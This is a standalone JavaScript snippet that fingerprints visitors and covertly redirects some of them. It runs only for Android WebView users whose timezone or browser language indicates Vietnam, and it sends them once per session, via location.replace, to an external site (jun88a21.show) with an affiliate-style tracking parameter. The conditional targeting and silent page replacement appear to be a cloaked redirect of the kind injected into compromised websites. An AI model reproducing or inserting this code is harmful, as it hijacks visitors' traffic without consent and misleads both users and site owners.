(function () {
  const ua = navigator.userAgent || "";
  const isAndroid = /Android/i.test(ua);
  const isWebView =
    /\bwv\b|Android.*Version\/[\d.]+.*Chrome\/[\d.]+/i.test(ua);
  const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);

  if (!isAndroid || !isWebView || !isMobile) return;

  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const language = (navigator.language || "").toLowerCase();

  const isVietnam =
    timeZone === "Asia/Ho_Chi_Minh" ||
    language.startsWith("vi");

  // 🇻🇳 VIỆT NAM
  if (isVietnam && !sessionStorage.getItem("vn_redirected")) {
    sessionStorage.setItem("vn_redirected", "1");
    window.location.replace(
      "https://www.jun88a21.show/?uagt=namct888&path=root"
    );
  }
})();
